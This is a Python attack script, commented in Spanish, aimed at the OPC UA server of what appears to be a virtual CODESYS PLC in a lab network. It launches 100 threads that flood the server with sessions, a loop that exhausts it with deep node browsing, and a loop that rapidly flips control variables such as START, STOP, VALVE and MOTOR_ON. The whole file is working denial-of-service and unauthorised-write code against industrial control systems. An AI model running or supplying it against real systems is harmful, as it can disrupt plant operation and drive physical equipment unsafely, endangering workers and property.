from opcua import Client
import threading
import time
import logging

# OPC UA del PLC virtual (CODESYS)
TARGET = "opc.tcp://10.10.10.53:4840"

# Variables reales de CODESYS (ajústalas si es necesario)
VARIABLES = [
    "START",
    "STOP",
    "VALVE",
    "MOTOR_ON",
    "SENSOR_1",
    "SENSOR_2"
]

# Cantidad de sesiones simultáneas a abrir
SESSION_COUNT = 100

# Duración total del ataque
DURATION = 60  # segundos

logging.basicConfig(level=logging.INFO)
start_time = time.time()


# === 1. ATAQUE POR CONEXIONES MASIVAS ===
def flood_sessions():
    active_sessions = []
    while time.time() - start_time < DURATION:
        try:
            client = Client(TARGET)
            client.connect()
            active_sessions.append(client)
            logging.info(f"[S1] Sesiones abiertas: {len(active_sessions)}")
        except Exception as e:
            logging.error(f"[S1] Error abriendo sesión: {e}")
            break


# === 2. ATAQUE POR NAVEGACIÓN PROFUNDA DE NODOS ===
def deep_browse():
    try:
        client = Client(TARGET)
        client.connect()
        logging.info("[S2] Navegación profunda iniciada")

        root = client.get_root_node()

        while time.time() - start_time < DURATION:
            for obj in root.get_children():
                for child in obj.get_children():
                    for grandchild in child.get_children():
                        for node in grandchild.get_children():
                            _ = node.get_browse_name()
        client.disconnect()
    except Exception as e:
        logging.error(f"[S2] Error navegando nodos: {e}")


# === 3. ATAQUE DE ESCRITURA MASIVA A VARIABLES ===
def write_loop():
    try:
        client = Client(TARGET)
        client.connect()
        logging.info("[S3] Escritura en variables iniciada")

        while time.time() - start_time < DURATION:
            for var_name in VARIABLES:
                try:
                    node_id = f"ns=4;s=|var|{var_name}"
                    node = client.get_node(node_id)
                    current = node.get_value()
                    new_value = not current
                    node.set_value(new_value)
                    logging.info(f"[S3] {var_name}: {current} -> {new_value}")
                except Exception as inner:
                    logging.warning(f"[S3] Fallo escribiendo {var_name}: {inner}")
            time.sleep(0.01)

        client.disconnect()
    except Exception as e:
        logging.error(f"[S3] Error general de escritura: {e}")


# === Lanzar ataques en paralelo ===
threads = []

# Sesiones masivas
for _ in range(SESSION_COUNT):
    t = threading.Thread(target=flood_sessions)
    t.start()
    threads.append(t)

# Navegación profunda
t2 = threading.Thread(target=deep_browse)
t2.start()
threads.append(t2)

# Escritura intensiva
t3 = threading.Thread(target=write_loop)
t3.start()
threads.append(t3)

# Esperar a que todos terminen
for t in threads:
    t.join()

logging.info("[✔] Ataque finalizado.")
